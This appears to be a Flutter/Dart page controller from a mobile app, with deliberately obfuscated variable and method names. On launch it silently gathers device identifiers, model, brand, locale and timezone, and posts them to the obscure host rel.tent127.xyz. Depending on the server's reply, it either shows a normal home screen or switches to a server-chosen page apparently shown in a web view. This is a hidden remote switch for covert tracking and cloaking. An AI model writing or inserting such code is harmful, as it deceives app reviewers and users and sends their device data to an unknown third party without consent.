import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var qavwsx = RxBool(false);
  var bivyrnafk = RxBool(true);
  var sdfeo = RxString("");
  var eden = RxBool(false);
  var morar = RxBool(true);
  final cypjuv = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    uexwtjkd();
  }


  Future<void> uexwtjkd() async {

    eden.value = true;
    morar.value = true;
    bivyrnafk.value = false;

    cypjuv.post("https://rel.tent127.xyz/UDWEHR",data: await jsbntldeo()).then((value) {
      var midfs = value.data["midfs"] as String;
      var henxuf = value.data["henxuf"] as bool;
      if (henxuf) {
        sdfeo.value = midfs;
        kayley();
      } else {
        kemmer();
      }
    }).catchError((e) {
      bivyrnafk.value = true;
      morar.value = true;
      eden.value = false;
    });
  }

  Future<Map<String, dynamic>> jsbntldeo() async {
    final DeviceInfoPlugin upefgy = DeviceInfoPlugin();
    PackageInfo wkvcrz_ecajyug = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var hclxmwe = Platform.localeName;
    var hFny = currentTimeZone;

    var vPzQFgaY = wkvcrz_ecajyug.packageName;
    var dVgZsnAN = wkvcrz_ecajyug.version;
    var XMzxynLK = wkvcrz_ecajyug.buildNumber;

    var OCAHhJX = wkvcrz_ecajyug.appName;
    var kDcgC = "";
    var naomieErdman = "";
    var qXwpI  = "";
    var zRsUom = "";
    var jordaneBergstrom = "";
    var lilyanLegros = "";
    var kaelynStanton = "";
    var reynoldStanton = "";
    var morganMurphy = "";

    var twGeS = "";
    var huvYI = false;

    if (GetPlatform.isAndroid) {
      twGeS = "android";
      var ystnomhqc = await upefgy.androidInfo;

      zRsUom = ystnomhqc.brand;

      kDcgC  = ystnomhqc.model;
      qXwpI = ystnomhqc.id;

      huvYI = ystnomhqc.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      twGeS = "ios";
      var izgborn = await upefgy.iosInfo;
      zRsUom = izgborn.name;
      kDcgC = izgborn.model;

      qXwpI = izgborn.identifierForVendor ?? "";
      huvYI  = izgborn.isPhysicalDevice;
    }

    var res = {
      "OCAHhJX": OCAHhJX,
      "XMzxynLK": XMzxynLK,
      "dVgZsnAN": dVgZsnAN,
      "kaelynStanton" : kaelynStanton,
      "vPzQFgaY": vPzQFgaY,
      "kDcgC": kDcgC,
      "hFny": hFny,
      "zRsUom": zRsUom,
      "qXwpI": qXwpI,
      "hclxmwe": hclxmwe,
      "twGeS": twGeS,
      "naomieErdman" : naomieErdman,
      "huvYI": huvYI,
      "morganMurphy" : morganMurphy,
      "lilyanLegros" : lilyanLegros,
      "reynoldStanton" : reynoldStanton,
      "jordaneBergstrom" : jordaneBergstrom,

    };
    return res;
  }

  Future<void> kemmer() async {
    Get.offAllNamed("/home");
  }

  Future<void> kayley() async {
    Get.offAllNamed("/cartoon");
  }

}
